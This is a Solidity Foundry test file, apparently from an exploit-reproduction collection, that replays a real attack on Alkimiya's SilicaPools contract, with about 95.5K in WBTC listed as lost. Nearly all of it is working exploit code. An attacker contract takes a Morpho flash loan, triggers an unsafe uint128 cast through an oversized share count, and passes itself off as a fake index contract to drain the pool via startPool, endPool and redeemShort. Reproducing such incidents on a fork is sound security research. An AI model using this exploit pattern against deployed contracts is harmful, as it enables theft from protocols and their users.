// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 95.5 K (1.14015390 WBTC)
// Original Attacker : 0xF6ffBa5cbF285824000daC0B9431032169672B6e
// MEV frontrunner : Yoink(0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A)
// Attack Contract : https://etherscan.io/address/0x80bf7db69556d9521c03461978b8fc731dbbd4e4
// Vulnerable Contract : https://etherscan.io/address/0xf3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
// Attack Tx : https://etherscan.io/tx/0x9b9a6dd05526a8a4b40e5e1a74a25df6ecccae6ee7bf045911ad89a1dd3f0814
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant silicaPools = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
address constant morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

contract Alkimiya_io_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 22_146_340 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attC = new AttackerC();
        
        attC.attack();

        console2.log("Profit:", IFS(WBTC).balanceOf(address(attC)), 'WBTC');
    }
}

contract AttackerC {
    uint256 id;

    function attack() external {
        IFS(WBTC).approve(silicaPools, type(uint256).max);
        IFS(WBTC).approve(morpho, type(uint256).max);
        
        IFS(morpho).flashLoan(
            WBTC, 
            1000000000, 
            ''
        );
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        IFS(WBTC).transfer(silicaPools, 56125794);

        IFS.PoolParams memory poolParams = IFS.PoolParams(
            41,
            46,
            address(this), // index
            uint48(block.timestamp),
            uint48(block.timestamp),
            WBTC
        );

        IFS(silicaPools).collateralizedMint(
            poolParams,
            bytes32(0),
            uint256(type(uint128).max) + 2, // To trigger the unsafecast `uint128(shares)`
            address(this),
            address(this)
        );

        IFS(silicaPools).safeTransferFrom(
            address(this), 
            address(1),
            id, 
            type(uint128).max,
            ""
        );

        IFS(silicaPools).startPool(poolParams);
        IFS(silicaPools).endPool(poolParams);
        IFS(silicaPools).redeemShort(poolParams);
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 _id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        // Only the second id is used, the fist is overwrite
        id = _id;

        return AttackerC.onERC1155Received.selector;
    }

    // Used by index param of PoolParams on collateralizedMint and startPool functions

    function decimals() external returns(uint256) {
        return 31;
    }

    function transferFrom(address from, address to, uint256) external returns(bool) {
        return true;
    }

    function shares() external returns(uint256) {
        return 1;
    }

    function balance() external returns(uint256) {
        return 0;
    }
}

interface IFS is IERC20 {
    // Morpho
    function flashLoan(address token, uint256 assets, bytes calldata data) external;

    // SilicaPools
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    function collateralizedMint(
        PoolParams calldata poolParams,
        bytes32 orderHash,
        uint256 shares,
        address longRecipient,
        address shortRecipient
    ) external;

    function startPool(PoolParams calldata poolParams) external;
    function endPool(PoolParams calldata poolParams) external;
    function redeemShort(PoolParams calldata shortParams) external;

    function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) external;
}

